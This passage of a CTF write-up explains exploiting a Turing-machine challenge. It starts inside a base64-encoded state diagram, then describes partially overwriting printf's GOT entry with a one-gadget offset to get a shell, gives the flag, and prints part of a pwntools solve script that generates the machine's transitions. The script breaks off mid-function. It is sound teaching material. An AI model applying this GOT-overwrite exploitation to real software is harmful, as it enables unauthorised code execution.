Q7cTE2IC0tPgo8ZyBpZD0iZWRnZTM0IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMTYtJmd0O3ExNjwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik0xMTE3LjY5LC01MC41NEMxMTE0LjgsLTYwLjY0IDExMTguOCwtNzAuMjUgMTEyOS43LC03MC4yNSAxMTM2LjE4LC03MC4yNSAxMTQwLjIyLC02Ni44NiAxMTQxLjgzLC02MS45OSIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSIxMTQ1LjMzLC02Mi4wMiAxMTQxLjczLC01Mi4wNSAxMTM4LjMzLC02Mi4wOSAxMTQ1LjMzLC02Mi4wMiIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIxMTI5LjciIHk9Ii03NC40NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAwLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTE2JiM0NTsmZ3Q7cTE3IC0tPgo8ZyBpZD0iZWRnZTMzIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMTYtJmd0O3ExNzwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik0xMTU2Ljg1LC0zNi45N0MxMTc1LjY4LC0zOS41NyAxMjAxLjM5LC00NC40OSAxMjIyLjU0LC01My40NSAxMjI4LjQ5LC01NS45NyAxMjM0LjQ3LC01OS4zNCAxMjQwLjAzLC02Mi45Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjEyMzgsLTY1Ljc1IDEyNDguMjIsLTY4LjU0IDEyNDEuOTcsLTU5Ljk5IDEyMzgsLTY1Ljc1Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjExOTguNjIiIHk9Ii01Ny42NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTExJiM0NTsmZ3Q7cTEyIC0tPgo8ZyBpZD0iZWRnZTIzIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMTEtJmd0O3ExMjwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik00NjcuMzgsLTYyLjA2QzQ4OC4wNiwtNjUuMSA1MTcuMzEsLTY5LjQxIDU0MC40NSwtNzIuODEiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNTM5LjY4LC03Ni4yNCA1NTAuMDgsLTc0LjIzIDU0MC43LC02OS4zMSA1MzkuNjgsLTc2LjI0Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjUwOS40MyIgeT0iLTc1LjQxIiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjAg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxMTEmIzQ1OyZndDtxMTIgLS0+CjxnIGlkPSJlZGdlMjQiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnExMS0mZ3Q7cTEyPC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTQ2NC4zMSwtNDguOThDNDgzLjIzLC00Mi42NiA1MTAuNjEsLTM2LjcyIDUzMy4zNSwtNDQuNDUgNTQwLjgzLC00Ni45OSA1NDguMDMsLTUxLjM3IDU1NC4zNiwtNTYuMTUiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNTUxLjg1LC01OC42MSA1NjEuNzksLTYyLjMgNTU2LjMyLC01My4yMyA1NTEuODUsLTU4LjYxIi8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjUwOS40MyIgeT0iLTQ4LjY1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDEsIFI8L3RleHQ+CjwvZz4KPCEtLSBxMTMmIzQ1OyZndDtxNiAtLT4KPGcgaWQ9ImVkZ2UyNyIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTEzLSZndDtxNjwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik03NDEuMTIsLTY1LjQ0Qzc1OS45NywtNzEuNDUgNzg2LjcxLC04MC43NSA4MDkuMDMsLTkxLjQ1IDgxNC4yNCwtOTMuOTUgODE5LjYyLC05Ni44OSA4MjQuNzUsLTk5Ljg5Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjgyMi41NiwtMTAyLjY2IDgzMi45MiwtMTA0Ljg2IDgyNi4yLC05Ni42OCA4MjIuNTYsLTEwMi42NiIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI3ODUuMTEiIHk9Ii05NS42NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTE0IC0tPgo8ZyBpZD0ibm9kZTE3IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMTQ8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iODU0LjAzIiBjeT0iLTM4LjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI4NTQuMDMiIHk9Ii0zNC4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xMTQ8L3RleHQ+CjwvZz4KPCEtLSBxMTMmIzQ1OyZndDtxMTQgLS0+CjxnIGlkPSJlZGdlMjgiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnExMy0mZ3Q7cTE0PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTczOC4xMiwtNDcuMzNDNzQ1LjI1LC00NC4xNSA3NTMuMzksLTQxLjEgNzYxLjE5LC0zOS40NSA3NzguOTMsLTM1LjY5IDc5OS4wNCwtMzUuMDQgODE1LjkxLC0zNS40NyIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI4MTUuMzUsLTM4Ljk1IDgyNS40OSwtMzUuODYgODE1LjY0LC0zMS45NiA4MTUuMzUsLTM4Ljk1Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9Ijc4NS4xMSIgeT0iLTQzLjY1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxMTQmIzQ1OyZndDtxNyAtLT4KPGcgaWQ9ImVkZ2UyOSIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTE0LSZndDtxNzwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik04NzguOTYsLTQ1LjQ0Qzg5Ny44MSwtNTEuNDUgOTI0LjU0LC02MC43NSA5NDYuODcsLTcxLjQ1IDk1Mi4wOCwtNzMuOTUgOTU3LjQ2LC03Ni44OSA5NjIuNTksLTc5Ljg5Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9Ijk2MC40LC04Mi42NiA5NzAuNzYsLTg0Ljg2IDk2NC4wNCwtNzYuNjggOTYwLjQsLTgyLjY2Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjkyMi45NSIgeT0iLTc1LjY1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjAg4oaSIDEsIFI8L3RleHQ+CjwvZz4KPCEtLSBxMTUgLS0+CjxnIGlkPSJub2RlMTgiIGNsYXNzPSJub2RlIj4KPHRpdGxlPnExNTwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSI5OTEuODciIGN5PSItMTguMjUiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9Ijk5MS44NyIgeT0iLTE0LjA1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnExNTwvdGV4dD4KPC9nPgo8IS0tIHExNCYjNDU7Jmd0O3ExNSAtLT4KPGcgaWQ9ImVkZ2UzMCIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTE0LSZndDtxMTU8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNODc1Ljk2LC0yNy4zM0M4ODMuMDksLTI0LjE1IDg5MS4yMywtMjEuMSA4OTkuMDMsLTE5LjQ1IDkxNi43NywtMTUuNjkgOTM2Ljg4LC0xNS4wNCA5NTMuNzUsLTE1LjQ3Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9Ijk1My4xOSwtMTguOTUgOTYzLjMzLC0xNS44NiA5NTMuNDcsLTExLjk2IDk1My4xOSwtMTguOTUiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iOTIyLjk1IiB5PSItMjMuNjUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MSDihpIgMCwgUjwvdGV4dD4KPC9nPgo8IS0tIHExNSYjNDU7Jmd0O3ExNiAtLT4KPGcgaWQ9ImVkZ2UzMSIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTE1LSZndDtxMTY8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTAxOC43NCwtMjEuM0MxMDM5LjQxLC0yMy43MyAxMDY4LjY2LC0yNy4xOCAxMDkxLjgsLTI5LjkiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMTA5MS4wOSwtMzMuMzQgMTEwMS40MywtMzEuMDQgMTA5MS45LC0yNi4zOSAxMDkxLjA5LC0zMy4zNCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIxMDYwLjc4IiB5PSItMzIuODIiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MCDihpIgMCwgUjwvdGV4dD4KPC9nPgo8IS0tIHExNSYjNDU7Jmd0O3ExNiAtLT4KPGcgaWQ9ImVkZ2UzMiIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTE1LSZndDtxMTY8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTAxNS41NiwtOC44NkMxMDM0LjQxLC0yLjQxIDEwNjEuNzUsMy43OSAxMDg0LjcsLTMuNDUgMTA5MS41OSwtNS42MiAxMDk4LjM0LC05LjI5IDExMDQuNCwtMTMuMzciLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMTEwMS45NCwtMTUuOSAxMTEyLjA2LC0xOS4wMyAxMTA2LjEsLTEwLjI3IDExMDEuOTQsLTE1LjkiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMTA2MC43OCIgeT0iLTcuNjUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MSDihpIgMSwgUjwvdGV4dD4KPC9nPgo8L2c+Cjwvc3ZnPg==">
<figcaption>The upper states are the non-carry states and the lower states are the carry states. `q17` is the end state. </figcaption>
</figure>
<h3 id="putting-it-together">Putting it together </h3>
<p>The actual value we've used to find the got is: <code>0x6f000007</code><br>
It is composed of the last three nibbles of the printf address which are constant even under ASLR and the highest 5 nibbles from the GOT entry before printf, which are also constant because how the linux address space is layouted.</p>
<p>Because we overshoot the actual position we are looking for, we have to go back for <code>5 * 4 + 1</code> (4 nibbles + we moved one too further) bits to the right.</p>
<p>The partial overwrite of the GOT entry <em>can</em> be split into two parts. The lower three nibbles of the address can simply be overwritten because they are not affected by ASLR. This would save a few states in the turing machine. But we actually have enough states to add the full offset. My original solution during the CTF implemented a version where this step was split.</p>
<p><code>printf</code> is at offset <code>0x606f0</code> in the used libc. Thus, the offset from <code>printf</code> to the one gadget is <code>0x8b64f</code> and we can use our adding implementation to add that offset.</p>
<p>The last important step is to reach the <code>HALT</code> state because only then <code>printf</code> is called and we'll get the shell.</p>
<h2 id="flag">Flag </h2>
<p><code>grey{congrats_on_solving_BB-100!}</code></p>
<h2 id="solve-script">Solve Script </h2>
<pre data-role="codeBlock" data-info="python" class="language-python python"><code><span class="token keyword keyword-import">import</span> enum
<span class="token keyword keyword-from">from</span> pwn <span class="token keyword keyword-import">import</span> <span class="token operator">*</span>


<span class="token keyword keyword-class">class</span> <span class="token class-name">Dir</span><span class="token punctuation">(</span>enum<span class="token punctuation">.</span>StrEnum<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Left <span class="token operator">=</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
    Right <span class="token operator">=</span> <span class="token string">"R"</span>


NUM_STATE <span class="token operator">=</span> <span class="token number">100</span>

transitions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>


<span class="token keyword keyword-def">def</span> <span class="token function">extract_bit</span><span class="token punctuation">(</span>bit_idx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> val<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">:</span> Dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 
      Extract a bit from the given value depending on the direction 
      - Left: Index 0 is MSB.
      - Right: Index 0 is LSB.
    """</span>
    <span class="token keyword keyword-if">if</span> <span class="token builtin">dir</span> <span class="token operator">==</span> Dir<span class="token punctuation">.</span>Left<span class="token punctuation">:</span>
        <span class="token keyword keyword-return">return</span> <span class="token punctuation">(</span>val <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> bit_idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span>
    <span class="token keyword keyword-else">else</span><span class="token punctuation">:</span>
        <span class="token keyword keyword-return">return</span> <span class="token punctuation">(</span>val <span class="token operator">&gt;&gt;</span> bit_idx<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span>


<span class="token keyword keyword-def">def</span> <span class="token function">search_for</span><span class="token punctuation">(</span>val<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 
      Search for a value on the tape while going to the left.
      Stops after the value.
    """</span>
    <span class="token keyword keyword-global">global</span> transitions
    search_start <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token builtin">dir</span> <span class="token operator">=</span> Dir<span class="token punctuation">.</span>Left
    <span class="token keyword keyword-for">for</span> bit_idx <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> extract_bit<span class="token punctuation">(</span>bit_idx<span class="token punctuation">,</span> val<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">)</span>

        <span class="token comment"># check for prefixes:</span>
        <span class="token comment"># we want to return to the state which represents the prefix even though</span>
        <span class="token comment"># the current run failed</span>

        prefix_start <span class="token operator">=</span> search_start
        currently_parsed <span class="token operator">=</span> <span class="token punctuation">(</span>val <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> bit_idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span>
        currently_parsed <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span>bit <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword keyword-for">for</span> prefix_len <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bit_idx<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            parsed_suffix <span class="token operator">=</span> currently_parsed <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> prefix_len<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
            val_prefix <span class="token operator">=</span> val <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> prefix_len<span class="token punctuation">)</span>
            <span class="token keyword keyword-assert">assert</span> <span class="token punctuation">(</span><span class="token builtin">dir</span> <span class="token operator">==</span> Dir<span class="token punctuation">.</span>Left<span class="token punctuation">)</span>
            <span class="token keyword keyword-if">if</span> parsed_suffix <span class="token operator">==</span> val_prefix<span class="token punctuation">:</span>
                prefix_start <span class="token operator">=</span> search_start <span class="token operator">+</span> prefix_len
                <span class="token keyword keyword-break">break</span>

        transitions <span class="token operator">+=</span> <span class="token punctuation">[</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword keyword-if">if</span> bit <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword keyword-else">else</span> prefix_start<span class="token punctuation">)</span><span class="token punctuation">,</span>
             <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword keyword-if">if</span> bit <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword keyword-else">else</span> prefix_start<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span>


<span class="token keyword keyword-def">def</span> <span class="token function">write_val</span><span class="token punctuation">(</span>val<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">:</span> Dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" Write a bit for bit onto the tape. """</span>
    <span class="token keyword keyword-global">global</span> transitions
    <span class="token keyword keyword-for">for</span> bit_idx <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> extract_bit<span class="token punctuation">(</span>bit_idx<span class="token punctuation">,</span> val<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">)</span>
        transitions <span class="token operator">+=</span> <span class="token punctuation">[</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>


<span class="token keyword keyword-def">def</span> <span class="token function">add_val</span><span class="token punctuation">(</span>val<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" Add a value to the tape. Goes to the Right on the tape. """</span>
    <span class="token keyword keyword-global">global</span> transitions
    <span class="token builtin">dir</span> <span class="token operator">=</span> Dir<span class="token punctuation">.</span>Right
    start_state <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>transitions<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token comment"># non-carry states</span>
    <span class="token keyword keyword-for">for</span> bit_idx <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> extract_bit<span class="token punctuation">(</span>bit_idx<span class="token punctuation">,</span> val<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">)</span>
        transitions <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> start_state <span class="token operator">+</span> bit_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                         <span class="token punctuation">(</span>bit <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>start_state <span class="token operator">+</span> length <span class="token operator">+</span> bit_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword keyword-if">if</span> bit <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword keyword-else">else</span> <span class="token punctuation">(</span>start_state <span class="token operator">+</span> bit_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    <span class="token comment"># just go to the end state of the operation</span>
    transitions <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> start_state <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                     <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> start_state <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    <span class="token comment"># carry-states</span>
    <span class="token keyword keyword-for">for</span> bit_idx <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> extract_bit<span class="token punctuation">(</span>bit_idx<span class="token punctuation">,</span> val<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">)</span>
        transitions <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>
                        <span class="token punctuation">(</span>bit <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>start_state <span class="token operator">+</span> bit_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
                         <span class="token keyword keyword-if">if</span> bit <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword keyword-else">else</span> <span class="token punctuation">(</span>start_state <span class="token operator">+</span> length <span class="token operator">+</span> bit_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> start_state <span class="token operator">+</span> length <span class="token operator">+</span> bit_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
                        <span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token comment"># last carry &amp; maybe infinite carries</span>
    transitions <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> start_state <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                     <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>start_state <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>


<span class="token keyword keyword-def">def</span> <span class="token function">export_graphviz</span><span class="token punctuation">(</span>trans<span class="token punctuation">,</span> offset<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" 
      Generates a representation for the transitions in the graphviz DOT language.
      Useful for debugging.

      `offset`: If `trans` is a subset of the transitions, adds constant offset to the loop index to find the state index. 
    """</span>
    dot <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"digraph TuringMachine {"</span><span class="token punctuation">,</span> <span class="token string">"  rankdir=LR;"</span><span class="token punctuation">]</span>

    get_state <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword keyword-lambda">lambda</span> i<span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"q</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token keyword keyword-for">for</span> i<span class="token punctuation">,</span> <span class="token punctuation">(</span>t0<span class="token punctuation">,</span> t1<span class="token punctuation">)</span> <span class="token keyword keyword-in">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>trans<span class="token punctuation">)</span><span class="token punctuation">:</span>
        cur_state <span class="token operator">=</span> get_state<span class="token punctuation">(</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span>

        <span class="token comment"># Transition for tape symbol 0</span>
        sym0<span class="token punctuation">,</span> dir0<span class="token punctuation">,</span> ns0 <span class="token operator">=</span> t0
        next_state0 <span class="token operator">=</span> get_state<span class="token punctuation">(</span>ns0<span class="token punctuation">)</span>
        label0 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0 → </span><span class="token interpolation"><span class="token punctuation">{</span>sym0<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>dir0<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        dot<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'  </span><span class="token interpolation"><span class="token punctuation">{</span>cur_state<span class="token punctuation">}</span></span><span class="token string"> -&gt; </span><span class="token interpolation"><span class="token punctuation">{</span>next_state0<span class="token punctuation">}</span></span><span class="token string"> [label="</span><span class="token interpolation"><span class="token punctuation">{</span>label0<span class="token punctuation">}</span></span><span class="token string">"];'</span></span><span class="token punctuation">)</span>

        <span class="token comment"># Transition for tape symbol 1</span>
        sym1<span class="token punctuation">,</span> dir1<span class="token punctuation">,</span> ns1 <span class="token operator">=</span> t1
        next_state1 <span class="token operator">=</span> get_state<span class="token punctuation">(</span>ns1<span class="token punctuation">)</span>
        label1 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"1 → </span><span class="token interpolation"><span class="token punctuation">{</span>sym1<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>dir1<span class="token punctuation">}</span></span><span class="token string">"</span></span>
